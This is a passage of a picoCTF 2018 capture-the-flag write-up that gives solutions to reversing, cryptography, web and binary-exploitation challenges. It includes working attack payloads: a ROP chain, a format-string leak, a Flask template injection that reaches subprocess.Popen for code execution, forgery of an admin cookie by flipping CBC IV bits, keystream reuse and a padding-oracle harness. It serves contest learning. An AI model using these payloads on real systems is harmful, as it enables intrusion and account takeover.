To decrypt, take m^d mod n.
d is the secret decryption exponent and it can be calculated easily only if you know p and q.
Then calculate phi as (p-1) * (q-1), d is the modular inverse of phi.
```python
phi = (p - 1) * (q - 1)
d =  gmpy2.invert(e, phi)
m = pow(c, d, n)
```
This is all that is needed to answer the questions. Maybe it was a question about the chinese remainder theory too. That is another way to do the same calculations, with smaller numbers. If there is a question about CRT, use the following equations:
```python
dp = gmpy2.invert(e, (p-1))
dq = gmpy2.invert(e, (q-1))
qinv = gmpy2.invert(q, p)
m1 = pow(c, dp, p)
m2 = pow(c, dq, q)
h = (qinv * (m1 - m2)) % p
m = m2 + h * q
```
CRT is a bit more complicated because the calculation is split into two parts. But the numbers are smaller so it takes fewer CPU cycles in total.

# be-quick-or-be-dead-2
### Reversing: 275p
As you enjoy this music even more, another executable [be-quick-or-be-dead-2](https://2018shell2.picoctf.com/static/03de046fdb675fc4effe67e9b4c2a08f/be-quick-or-be-dead-2) shows up. Can you run this fast enough too? You can also find the executable in /problems/be-quick-or-be-dead-2\_3\_bc41c1e2cd88c0e9d8a8d0cb851f91e9.

Similar to the previous one, nop out the call to set\_timer to remove the time limit. Then start a debugger. The problem this time is that it never finishes. It hangs in a recursive fibonacci routine, fib with input 0x422. Step over the call into that and input the result directly in gdb.
```C
int fib(int n)
{
  /* Declare an array to store Fibonacci numbers. */
  int f[n+2];   // 1 extra to handle case, n = 0
  int i;

  /* 0th and 1st number of the series are 0 and 1*/
  f[0] = 0;
  f[1] = 1;

  for (i = 2; i <= n; i++)
  {
      /* Add the previous 2 numbers in the series  and store it */
      f[i] = f[i-1] + f[i-2];
  }

  return f[n];
}
```
Btw, fib(0x422) is 1560427073. Just jump over the call to fib and set $rax=1560427073 directly after and the flag will be printed.

# in out error
### General Skills: 275
Can you utlize stdin, stdout, and stderr to get the flag from this [program](https://2018shell2.picoctf.com/static/455ef363191143f2deb050b912b91793/in-out-error)? You can also find it in /problems/in-out-error\_4\_c51f68457d8543c835331292b7f332d2 on the shell server.

Send stdout to /dev/null and get the flag from stderr:
```bash
echo "Please may I have the flag?" | ./in-out-error > /dev/null
```

# Artisinal Handcrafted HTTP 3
### Web Exploitation: 300p
We found a hidden flag server hiding behind a proxy, but the proxy has some... \_interesting\_ ideas of what qualifies someone to make HTTP requests. Looks like you'll have to do this one by hand. Try connecting via nc 2018shell2.picoctf.com 2651, and use the proxy to send HTTP requests to `flag.local`. We've also recovered a username and a password for you to use on the login page: `realbusinessuser`/`potoooooooo`.

```
GET / HTTP/1.1
Host: flag.local
a href="/login

GET /login HTTP/1.1
Host: flag.local
...
<form method="POST" action="login">
  <input type="text" name="user" placeholder="Username" />
  <input type="password" name="pass" placeholder="Password" />
  <input type="submit" />
</form>

POST /login HTTP/1.1
Host: flag.local
Content-Type: application/x-www-form-urlencoded
Content-Length: 51

user=realbusinessuser&pass=potoooooooo&action=login
...
set-cookie: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/

GET / HTTP/1.1
Host: flag.local
Cookie: real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/
...
<p>Hello <b>Real Business Employee</b>!  Today's flag is: <code>picoCTF{...
```

# SpyFi
### Cryptography: 300p
James Brahm, James Bond's less-franchised cousin, has left his secure communication with HQ running, but we couldn't find a way to steal his agent identification code. Can you? Conect with nc 2018shell2.picoctf.com 30399. [Source](https://2018shell2.picoctf.com/static/0cf0cf189f87fd142d6ddfc70af5ed3a/spy_terminal_no_flag.py).
```python
# spy_terminal_no_flag.py, change agent_code and insert a key
agent_code = "picoCTF{this_is_the_flag}"
# 16-byte key (32 hex digits)
key = "0"*32
```
The encrypt function uses *AES.new( key.decode('hex'), AES.MODE\_ECB )*. Looking at the code we see we can modify the length by entering a custom message and we know an entire 16-byte block by looking at the source code. We can generate different lengths ciphertexts, modify the length to make the guess fit into a 16 byte block with only one unknown character, loop and guess the unknown and recover one byte at a time. See [crack\_spyfi.py](crack_spyfi.py) for details.

# echooo
### Binary Exploitation: 300p
This program prints any input you give it. Can you [leak](https://2018shell2.picoctf.com/static/9a35d6aec3250ae1fbf67e19aeabaf1a/echo) the flag? Connect with nc 2018shell2.picoctf.com 57169. [Source](https://2018shell2.picoctf.com/static/9a35d6aec3250ae1fbf67e19aeabaf1a/echo.c).

Looking at the code we see a format string.

```C
fgets(buf, sizeof(buf), stdin);
printf(buf);
```
Try to enter a number of *%p* and see if anything resembles a pointer. Replace that *%p* with *%s* and see if it is the flag.
```
# After some fiddling
> %p %p %p %p %p %p %p %s
0x40 0xf77b25a0 0x8048647 0xf77e9a74 0x1 0xf77c1490 0xffb3b2e4 picoCTF{...
```

# learn gdb
### General Skills: 300p
Using a debugging tool will be extremely useful on your missions. Can you run this [program](https://2018shell2.picoctf.com/static/999e37c9737d95c105ea29ae5b3fac1f/run) in gdb and find the flag? You can find the file in /problems/learn-gdb\_3\_f1f262d9d48b9ff39efc3bc092ea9d7b on the shell server.
```bash
gdb run
start
break decrypt_flag
# Run until decrypt_flag finishes
finish
# main then calls puts with
# "Finished Reading Flag into global variable 'flag_buf'. Exiting."
info variables
...
0x6013e8 flag_buf
...
x flag_buf
'flag_buf' has unknown type; cast it to its declared type
x /4x &flag_buf
0x6013e8 <flag_buf>:    0x60    0x22    0x60    0x00
# Looks like pointer. Examine as pointer to string.
x /s (char *)flag_buf
0x602260:       "picoCTF{...}"
```

# Flaskcards
### Web Exploitation: 350p
### Hint: Are there any common vulnerabilities with the backend of the website?
We found this fishy [website](http://2018shell2.picoctf.com:51878/) for flashcards that we think may be sending secrets. Could you take a look?

Site runs Flask. Known vulnerability is server site template injection. Syntax for template injection is {{variable or function()}}. Common flask object is config, that holds all configuration items. Register any account. Log in. Try to enter
```javascript
{{config.items()}}
```
in various places. It is filtered out in most places, except Create Card, Question field. Enter question with SSTI injection code. List cards.
```
...
('SECRET_KEY', 'picoCTF{...}')
...
```

# Super Safe RSA
### Cryptography: 350p
Dr. Xernon made the mistake of rolling his own crypto.. Can you find the bug and decrypt the message? Connect with nc 2018shell2.picoctf.com 59208.
```
nc 2018shell2.picoctf.com 59208
c: 4994599759122993938442890056329361490809598043112954445227705585427147448347038
n: 20112796748032557324795718398645277893262213762188062192180591742668863918898167
e: 65537
```
n looks small. Try to factor it using factordb.com or cado-nfs.
```bash
git clone https://scm.gforge.inria.fr/anonscm/git/cado-nfs/cado-nfs.git
<build according to instructions>
./cado-nfs.py 20112796748032557324795718398645277893262213762188062192180591742668863918898167
```
It should return the two primes (p and q).
```python
p = 161965458760855232576107216911294760001
q = 124179543600894838930051548742522413978167
print p*q
# Verify that output is really n here
```
Done, found the factors. Now decrypt according to instructions above, in RSA madlib.
```python
import gmpy2
# set c, n, e, p, q according to above
phi = (p - 1) * (q - 1)
d =  gmpy2.invert(e, phi)
m = pow(c, d, n)
print hex(m)
```
Paste the output and pipe it into *xxd -r -ps*. The xxd utility can convert to/from hex, -ps means hex digits are in a long string without any formatting.

# be-quick-or-be-dead-3
### Reversing: 350p
As the song draws closer to the end, another executable [be-quick-or-be-dead-3](https://2018shell2.picoctf.com/static/1c6b067901d5342370a33ef986440f6f/be-quick-or-be-dead-3) suddenly pops up. This one requires even faster machines. Can you run it fast enough too? You can also find the executable in /problems/be-quick-or-be-dead-3\_4\_081de19947195d5a491290bc42530db6.

Similar to the previous two. This one calls calc(0x18f4b) where calc is a fibonacci-like function that again is recursive and never finishes. It decompiles to something like this:
```C
unsigned int calc(unsigned int a1)
{
  int v1, v2, v3, v4, v6;

  if ( a1 > 4 )
  {
    v1 = calc(a1 - 1);
    v2 = v1 - calc(a1 - 2);
    v3 = calc(a1 - 3);
    v4 = v3 - calc(a1 - 4) + v2;
    v6 = v4 + 4660 * calc(a1 - 5);
  }
  else
  {
    v6 = a1 * a1 + 9029;
  }
  return (unsigned int)v6;
}
```
Refactor this to an iterative function and it will finish:
```C
#define NUM 0x18F4B
unsigned int calcs[NUM + 1];
...
for (i = 0; i <= NUM; i++) {
    if (i <= 4) {
        calcs[i] = i * i + 9029;
    } else {
        v1 = calcs[i - 1];
        v2 = v1 - calcs[i - 2];
        v3 = calcs[i - 3];
        v4 = v3 - calcs[i - 4] + v2;
        calcs[i] = v4 + 4660 * calcs[i - 5];
    }
}
printf("%u\n", calcs[NUM]);
```
Run it and it returns *797760575*. In gdb, jump over calc and set $rax=797760575 directly after. Nop out or jump over set\_timer as before first.
```
gdb ./be-quick-or-be-dead-3
break calculate_key
```
At the call to calc(), jump over it by changing $pc and set $rax to what the output of calc() should be.
```
set $pc=0x4007a0
set $rax=797760575
```
Then continue to get the flag.

# core
### Forensics: 350p
This [program](https://2018shell2.picoctf.com/static/21896a776bfc5ba11a69a98c03e616e2/print_flag) was about to print the flag when it died. Maybe the flag is still in this [core](https://2018shell2.picoctf.com/static/21896a776bfc5ba11a69a98c03e616e2/core) file that it dumped? Also available at /problems/core\_0\_28700fe29cea151d6a3350f244f342b2 on the shell server.

```
gdb print_flag core
#0  print_flag () at ./print_flag.c:90
disas print_flag
...
   0x080487c7 <+6>:     mov    DWORD PTR [ebp-0xc],0x539
   0x080487ce <+13>:    mov    eax,DWORD PTR [ebp-0xc]
   0x080487d1 <+16>:    mov    eax,DWORD PTR [eax*4+0x804a080]
   0x080487db <+26>:    push   eax
   0x080487dc <+27>:    push   0x804894c
   0x080487e1 <+32>:    call   0x8048410 <printf@plt>
x /s 0x804894c
0x804894c:      "your flag is: picoCTF{%s}\n"
```
%s is the first argument on the stack. Reading the code above that pointer should be at 0x539 * 4 + 0x804a080.
```
print 0x539 * 4 + 0x804a080
$3 = 0x804b564
x/s *0x804b564
0x80610f0:      "abb6a3b2603654804ed357322c760510"
```
And that should be all. I don't really remember if this is the actual flag or not.

# quackme up
### Reversing: 350p
The duck puns continue. Can you crack, I mean quack this [program](https://2018shell2.picoctf.com/static/2bc85a4cb3e4366183c37ec9146a9d05/main) as well? You can find the program in /problems/quackme-up\_2\_bf9649c854a2615a35ccdc3660a31602 on the shell server.

Decompile with *retdec-decompiler.py main* and reverse engineer the algorithm to something like:
```python
for c in ciph:
    p1 = ord(c) ^ 0x16
    p1_l = p1 & 0x0f
    p1_h = (p1 & 0xf0) >> 4
    p2 = (p1_l << 4) + p1_h
    sys.stdout.write(chr(p2))
```
Where ciph is the encryptedBuffer
```bash
info variables
...
0x0804a030  encryptedBuffer
...
x /s (char *)encryptedBuffer
"11 80 20 E0 22 53 72 A1 01 41 55 20 A0 C0 25 E3 35 40 65 95 75 00 30 85 C1"
```
Just convert that to binary bytes and load into ciph in the provided python script above.

# rop chain
### Binary Exploitation: 350p
Can you exploit the following program and get the flag? You can findi the [program](https://2018shell2.picoctf.com/static/d7b3d809a1a0a71b4d49c6d110977326/rop) in /problems/rop-chain\_4\_6ba0c7ef5029f471fc2d14a771a8e1b9 on the shell server? [Source](https://2018shell2.picoctf.com/static/d7b3d809a1a0a71b4d49c6d110977326/rop.c).
```C
void vuln() {
  char buf[16];
  printf("Enter your input> ");
  return gets(buf);
}
```
That is the vuln part. Look at the source. A number of things need to be in the correct order on the stack. Offset to first ret pointer is 28. Then address of function win\_function1, win\_function2, flag function, 0xbaaaaaad, 0xdeadbad need to be there in that order. Just run under gdb and experiment with moving the arguments around. I used the following code to generate the payload:
```python
from pwn import *
e = ELF('./rop')
win1 = p32(e.symbols['win_function1'])
win2 = p32(e.symbols['win_function2'])
flag = p32(e.symbols['flag'])
offset = 28
payload = 'A'*offset + win1 + win2 + flag + p32(0xbaaaaaad) + p32(0xdeadbaad)
```
You could also find the addresses with objdump, but pwntools is faster and easier. To find the offset try to send in different number of A:s and 4 B:s until it crashes. Dump core by setting *ulimit -c unlimited* and find the crash address with *gdb rop core*. When it crashes at exactly 42424242 then the offset is correct.

To debug in gdb, for instance write the payload to a file, payload.bin.
```bash
gdb rop
break win_function1
run < payload.bin
```
Now gdb will stop if it enters win\_function1 and you can investigate the stack step by step from there. When you have a working payload.bin, run copy it to the contest server and run it. You could copy the entire python program to the contest server too, they have pwntools installed there.

# roulette
### General Skills: 350p
This Online [Roulette](https://2018shell2.picoctf.com/static/2d8417ef7707fec56592db02da54575e/roulette.c) Service is in Beta. Can you find a way to win $1,000,000,000 and get the flag? [Source](https://2018shell2.picoctf.com/static/2d8417ef7707fec56592db02da54575e/roulette.c). Connect with nc 2018shell2.picoctf.com 48312.

First clue to beat roulette.

```C
long get_rand() {
  ...
  srand(seed);
  return seed;
}
...
cash = get_rand();
```
So the cash you start with is the seed to srand. You can now seed srand and repeat the numbers rand() will return. But you will still have to gain one billion in max 16 wins. Now this can be done by exploiting a second bug.
```C
bet = get_long();
```
Look in the source for the implementation for get\_long(). If you bet more than LONG\_MAX (signed) it will become a negative number *and* it will be accepted even though you don't have that amount of money in the account. If you bet a negative number and loose you will actually gain more money... To find an exact number to enter, for instance -900000000 (close to minus one billion):
```C
void main(void) { printf("%u\n", -900000000); }
```
That will print the negative number as an unsigned positive number.

Now you have everything needed to win. A 3-win-streak is also needed when you pass one billion to get the flag. For instance bet the negative number and loose on the first bet. Then do two wins with low bets and a third win with a large bet.

Note. To simulate the rand() output a 32-bit linux system is needed. The 64-bit libc implementation doesn't reproduce the same sequence of numbers for the same seed.

# Radix's Terminal
### Reversing: 400p
Can you find the password to [Radix's login](https://2018shell2.picoctf.com/static/2f848bb17aae35fb0fc703cbe15afbef/radix)? You can also find the executable in /problems/radix-s-terminal\_1\_35b3f86ea999e44d72e988ef4035e872?
```bash
retdec-decompiler.py radix
ls
radix.c
```
The important function is *check\_password()*. It does some complicated stuff with the input (argv[1]) and then compares the result with the string "cGljb0NURntiQXNFXzY0X2VOQ29EaU5nX2lTX0VBc1lfMTg3NTk3NDV9". The trick is to figure out that it is a radix algorithm that is performed. More exactly the base64 radix algoritm. To get the correct input just echo the string | base64 --decode.

# assembly-3
### Reversing: 400p
What does asm3(0xf238999b,0xda0f9ac5,0xcc85310c) return? Submit the flag as a hexadecimal value (starting with '0x'). NOTE: Your submission for this question will NOT be in the normal flag format. [Source](https://2018shell2.picoctf.com/static/8574a4801ca14ef4666bc4a6e5f694c2/end_asm_rev.S) located in the directory at /problems/assembly-3\_2\_504fe35f4236db611941d162e2abc6b9.

Again, just comment out .bits 32, create a main.c file that does the asm3 call and link them together.
```bash
gcc -m32 -o end_asm_rev end_asm_rev.S main.c
./end_asm_rev
```
Fire it up in gdb to see exactly what happens.

# eleCTRic
# Cryptography: 400p
You came across a custom server that Dr Xernon's company eleCTRic Ltd uses. It seems to be storing some encrypted files. Can you get us the flag? Connect with nc 2018shell2.picoctf.com 36150. [Source](https://2018shell2.picoctf.com/static/c410541dec00f69c06ba940a918a24c2/eleCTRic.py).

Looking at the python code we see that when we generate a file (data doesn't matter) the encrypted and base64:red filename becomes the share code. To view a file only the share code is needed. The flag file name is generated by:
```python
flag_file_name = "flag_%s" % Random.new().read(10).encode('hex')
```
Then ".txt" is appended to the filename. So we know it consists of "flag\_" + 20 hex digits + ".txt". Now the mistake here is that the key *and* the counter is repeated for all file name encryptions. CTR mode creates a keystream by encrypting the counter with the key. If both repeats then the whole xor keystream repeats. To get the flag sharecode, generate a 25 character filename and save the share code.
```
Share code: BI2bIDdcHP11xACGFRPB/gSNmyA3XBz9das1vyA=
i
Files:
  AAAAAAAAAAAAAAAAAAAAAAAAA.txt
  flag_765057e59c02f0e1635c.txt
```
```bash
echo BI2bIDdcHP11xACGFRPB/gSNmyA3XBz9das1vyA= | base64 --decode > encA.bin
echo flag_765057e59c02f0e1635c.txt > flagname.txt
echo AAAAAAAAAAAAAAAAAAAAAAAAA.txt > filename.txt
xorfiles encA.bin filename.txt > keystream.bin
xorfiles keystream.bin flagname.txt | base64
I6C7Bikqa4kEsHaiYWvjj3eq6gRHK26JV6s1vyA=
```
Then choose D[e]crypt file and paste the calculated sharecode for the flag file. Note, the key and counter will be different everytime you start the program, but they are the same during one connection.

# store
### General Skills: 400p
We started a little [store](https://2018shell2.picoctf.com/static/655fb38d2f256165a0163d4a606f998a/store), can you buy the flag? [Source](https://2018shell2.picoctf.com/static/655fb38d2f256165a0163d4a606f998a/source.c). Connect with 2018shell2.picoctf.com 43581.

The problem is in this section:
```C
...
int number_flags = 0;
scanf("%d", &number_flags);
int total_cost = 1000*number_flags;
```
This is in the menu-section *"I Can't Believe its not a Flag"*.
If *number\_flags* is big, but less than *INT\_MAX* (around 2 billion) and
*total\_cost* is bigger than INT\_MAX (but less than twice as big) then
total\_cost will be negative and funds will increase. You will then have
enough to buy the real flag in the other menu alternative.

# Super Safe RSA 2
### Cryptography: 425p
Wow, he made the exponent really large so the encryption MUST be safe, right?! Connect with nc 2018shell2.picoctf.com 29483.
```
nc 2018shell2.picoctf.com 29483
c: 5150317611202303910039947944468321349460115327400169670702372453826704168498706970010442277069194451107893629726419017943643558424758503746856671160394485021290820031706695712807053939329037442968433265564280760568055218102649820431623358699466398480606587696141595460475375962426427291015581914956006245237
n: 107360969868501270672512351800422895167917553012121289227102873595966657479478271529847812592565980238559651149083326436285770288102900707572230791212337851791020051087791748553284771305845769006249864421003508519891554957329259841000897484101246510305605548424410863255284994053334702014151582916594854993217
e: 98708137989632483396741256965294132296914295081333724192121757915757067708713600729831697327693717125813079329051006826958803251745430552737610301425140241212165082901290306255301317253891267323495387002149078647334766293850161919855647571272886805151762998679757027445076941493585202823478026221607043850413
```
If e is this big the chance is that they made the error to *choose d* and *calculate e* instead of the opposite. If they did this then d is probably really small. Google [wiener attack](http://lmgtfy.com/?q=wiener+attack) for details. I performed it using [RsaCtfTool.py](https://github.com/Ganapati/RsaCtfTool.git).
```bash
./RsaCtfTool.py --createpub -n <n from above> -e <e from above> > badpublickey.pem
./RsaCtfTool.py --publickey bad.pem --verbose --private
```
Then you are basically done. Paste output to priv.pem and list details with openssl.
```bash
openssl rsa -in priv.pem -text -noout
...
privateExponent: 65537
```
That is d. Now we can calculate
```python
m = pow(c, d, n).
```
Done.

# Magic Padding Oracle
### Cryptography: 450p
### Hint: Padding oracle
Can you help us retreive the flag from this crypto service? Connect with nc 2018shell2.picoctf.com 27533. We were able to recover some [Source](https://2018shell2.picoctf.com/static/dffe0a1e59a8c33b80d21e4d6cb29f6f/pkcs7.py) Code.

I used the padding oracle module from featherduster to create a python template for a padding oracle attack. It requires you to implement a function on you own that takes a ciphertext as input and returns True if the padding is ok or False if the padding is bad.
```python
def padding_oracle(ciphertext):
    # Select local process or remote host/port
    p = process('./pkcs7.py')
    #p = remote('2018shell2.picoctf.com', 27533)
    p.recvuntil('What is your cookie?')
    c = ciphertext.encode('hex')
    p.sendline(c)
    ret = p.recvall()
    if not 'invalid' in ret:
        #print ret
        p.close()
        return True
    p.close()
    return False
```
Run against the local pkcs7.py source until you get it to work. Then change the p line to run remote on the real server. Examine the source for details.

# Secure Logon
### Web Exploitation: 500p
Uh oh, the login page is more secure... I think. http://2018shell2.picoctf.com:56265. [Source](https://2018shell2.picoctf.com/static/a39b448f70e7523eb03516bb9c211c1a/server_noflag.py).

Looking at the source we see encryption of the cookie is done by (only relevant lines from the source listed):
```python
encrypted = AESCipher(app.secret_key).encrypt(cookie_data)
...
self.key = md5(key.encode('utf8')).hexdigest()
cipher = AES.new(self.key, AES.MODE_CBC, iv)
```
One way to crack this would be to guess secret\_key candidates, md5 the candidate, decrypt and see if the string *admin* (or password or username) is in the decrypted data. The cookie\_data looks like this:
```python
cookie['password'] = request.form['password']
cookie['username'] = request.form['user']
cookie['admin'] = 0
cookie_data = json.dumps(cookie, sort_keys=True)
#                                ^^^^^^^^^^^^^^
```
But I wasn't able to crack the sekret\_key.

A simpler way exists though. Since the keys are sorted, cookie\_data will always start with *{"admin": 0, "password":...*.
So the *0* character will be at index 10 in cookie\_data. The first encrypted block is 16 bytes so the 0 is in the first block.
And in CBC mode, if the IV is sent together with the encrypted blocks, the attacker can modify the IV and have a predictable effect on the decryption of *the first block*.
Only the first block. But again, the 0 *is* in the first block. So do a request. Get a cookie with admin=0, xor IV at position 10 with 0x01 and send back a request with the modified IV in the cookie and get the flag.

As usual. Log in with firefox or chrome and have developer tools open. Log in as any user. Copy as cURL. The request, with irrelevant parameters removed:
```bash
curl 'http://2018shell2.picoctf.com:56265/flag' -H 'Cookie: cookie=v6F6CFM5joPjqpao2mIVMDTZwv5SHmzvuNxitr9KZUmor0BOkluD9bqb97K+ui3KebaS3kQgaGwlylw=='
echo -n 'v6F6CFM5joPjqpao2mIVMDTZwv5SHmzvuNxitr9KZUmor0BOkluD9bqbTxjiBWh97K+ui3KebaS3kQgaGwlylw==' | base64 --decode > cookie.bin
```
In my case the eleventh byte of cookie.bin was 0x96.
```python
print hex(0x96 ^ 0x01)
0x97
```
So I just used a hexeditor to change 0x96 to 0x97 in cookie.bin.
```bash
base64 < cookie_modified.bin
v6F6CFM5joPjqpeo2mIVMDTZwv5SHmzvuNxitr9KZUmor0BOkluD9bqbTxjiBWh97K+ui3KebaS3kQgaGwlylw==
curl 'http://2018shell2.picoctf.com:56265/flag' -H 'Cookie: cookie=v6F6CFM5joPjqpeo2mIVMDTZwv5SHmzvuNxitr9KZUmor0BOkluD9bqbTxjiBWh97K+ui3KebaS3kQgaGwlylw=='
```
Done.

# LoadSomeBits
### Forensics: 550p
Can you find the flag encoded inside this [image](https://2018shell2.picoctf.com/static/0c26fd8e840ff9cae4673a32f7f5fc83/pico2018-special-logo.bmp)? You can also find the file in /problems/loadsomebits\_0\_d87185d5ab62fa0048494157146e7b78 on the shell server.

Unfortunately the bmp-image is broken.
```bash
file pico2018-special-logo.bmp
PC bitmap, Windows 98/2000 and newer format, 1200 x 630 x 24
ls -l pico2018-special-logo.bmp
2268054 ...
echo $((1200*630*3))
2268000
```
So the image data is probably the last 2268000 bytes and the header the first 54 bytes. If we create a new r,g,b bmp-image with the same dimensions we can copy the first 54 bytes from there.
```bash
convert -size 1200x630 -depth 24 xc: blank.bmp
ls -l blank.bmp
2268138 ...
```
So the header created by imagemagick is 138 bytes. Nevermind. Just remove the 54 bytes and add the new 138 bytes.
```bash
dd if=pico2018-special-logo.bmp of=pixels.raw bs=1 skip=54
dd if=blank.bmp of=header.raw bs=1 count=138
cat header.raw pixels.raw > fixed.bmp
```
When I solved this the first time the fixed.bmp image was also laterally reversed. But when I wrote this writeup (friday, last day of competition) the image had been replaced and not mirrored anymore. Anyway. Stegsolve.jar shows dots in the lower left corner in plane 0 of r, g and b. Python code to solve this is already provided in the husky writeup above (reading between the eyes). Just change y to the last line instead of the first.

# assembly-4
### Reversing: 550
Can you find the flag using the following assembly [source](https://2018shell2.picoctf.com/static/3880512cf440330acd4b5bc0578c7ff8/comp.nasm)? WARNING: It is VERY long...

Use nasm to compile it this time.
```bash
nasm -f elf32 comp.nasm
ls
comp.o comp.asm
gcc -o comp comp.o
./comp
```

# Flaskcards Skeleton Key
### Web Exploitation: 600p
### Hint: What can you do with a flask Secret\_Key?
Nice! You found out they were sending the Secret\_key: a7a8342f9b41fcb062b13dd1167785f8. Now, can you find a way to log in as admin?
http://2018shell2.picoctf.com:53999

What we can do is decode the flask session cookie. Register as any user. Login. See [decode_flask_sessioncookie.py](decode_flask_sessioncookie.py) for code to decode the cookie.
In the cookie we find:
```javascript
{u'csrf_token': u'04da6bf67e87ce5709e1485b052b472b2d0d572f', u'_fresh': True, u'user_id': u'11', u'_id': u'7e7e36bc71bf8861e3921c9574751d2ed8f6cf62bf6ae522c2ee06d6e69929386fdbc45fa8362ba50af9ae2654c38e305478fa352cf75c37c97629e9d739b021'}
```
I tried to change user\_id to 0 but it didn't work. But when I changed it to ... 1, it worked. Edit the code and insert your own session cookie and run it to modify user\_id to 1 in it.

# Help Me Reset 2
### Web Exploitation: 600p
There is a website running at http://2018shell2.picoctf.com:18755. We need to get into any user for a flag!

No curl needed. Check username from html comment on start page. Enter that user on reset password page. Guess color/car/food/hero. Account lockout at third wrong guess. But then username changes at front page comment. Reset another user to unlock locked out user which gives unlimited tries. Continue to guess questions until you get three correct answers for one user, then change password for that user and log in to get the flag.

# Super Safe RSA 3
### Cryptography: 600p
The more primes, the safer.. right.?.? Connect with nc 2018shell2.picoctf.com 21287.
```
nc 2018shell2.picoctf.com 21287
c: 3669585155130962107865656484710091207002595363701996161821939131182967280319485682592396933993100418638626442305185768842163744447943341826447561251127158680334235364369259961505938851384738869091889701040712419493934669980660427444509226958378443769719112535229000674978146031055541790032141661483979925                                
n: 5053973076678014684460295150127834948650954321301412170813163380496558248588326874380074364240673704985740333742328115503598125503936368589643438363145833689977154560081730288634912410705840487698799604532939269536850312459310915396089174389889388668725268784627640756099604624870524674457579011646561349                                
e: 65537
```
The numbers change at each connect. But each time n is the product of more than two primes. Even though n is big, no single prime is larger than 10 digits. It can even be factored without cado-nfs.
```
factor 5053973076678014684460295150127834948650954321301412170813163380496558248588326874380074364240673704985740333742328115503598125503936368589643438363145833689977154560081730288634912410705840487698799604532939269536850312459310915396089174389889388668725268784627640756099604624870524674457579011646561349
2162901667 2187158639 2270484631 2289426569 2310599303 2343957997 2454099173 2515845911 2584288229 2646738121 2661902597 2767888583 2846032039 2909706209 2921727229 3062168689 3138113863 3192121601 3663074837 3684558583 3718197013 3746326841 3755361221 3773772377 3777167501 3786409069 3895665749 3939278411 3994711789 4021801073 4126558151 4238757491
```
Now how do we calculate m when n is the product of lots of primes? Like this:
```python
phi = 1
for p in primes:
    phi *= p - 1
```
That's all. Then just calculate m as for normal RSA:
```python
d =  gmpy2.invert(e, phi)
m = pow(c, d, n)
```

# special-pw
### Reversing: 600p
Can you figure out the right argument to this program to login? We couldn't manage to get a copy of the binary but we did manage to [dump](https://2018shell2.picoctf.com/static/486a986e9c10b9c2d63a00360388b6bd/special_pw.S) some machine code and memory from the running process.

Now this was tricky, but I managed to manually reverse what was happening in the assembly code with the following [C-code](special-pw.c). Check it for details.

# A Simple Question
### Web Exploitation: 650p
There is a website running at http://2018shell2.picoctf.com:15987. Try to see if you can answer its question.

Obviously a SQLite3 injection. But I didn't manage to get it to work. Luckily enough a teammate of mine did.
```bash
curl http://2018shell2.picoctf.com:15987/answer2.php -d "debug=1&answer=41AndSixSixths"
```
He dumped the whole answers table using [sqlmap](http://sqlmap.org/) and Time-Based attack. There was only one answer.

# Flaskcards and Freedom
### Web Exploitation: 900p
### Hints: There's more to the original vulnerability than meets the eye. Can you leverage the injection technique to get remote code execution?
There seem to be a few more files stored on the flash card server but we can't login. Can you? http://2018shell2.picoctf.com:52168.

The injection with *{{config}}*, *{{config.items()}}* or *{{request.environ}}* and any function listed from there still works in the *question* part of *Create Card*. But none of these can be used to gain remote code execution. After some searching I found [this blog post](https://www.lanmaster53.com/2016/03/11/exploring-ssti-flask-jinja2-part-2/). I basically used the same technique, with some modifications.
```javascript
{{''.__class__.mro()[1].__subclasses__()}}
```
That injection lists all methods that can be called. One of them is *subprocess.Popen()*. When I ran this it was at index 258 in the list that subclasses returned.
```javascript
{{''.__class__.__mro__[1].__subclasses__()[258](['ls'],stdout=-1).communicate()[0]}}
```
It was hard to get the output because subprocess.PIPE was not in the subclasses listed. A line of python showed me though that *subprocess.PIPE* can be replaced with just *-1*.
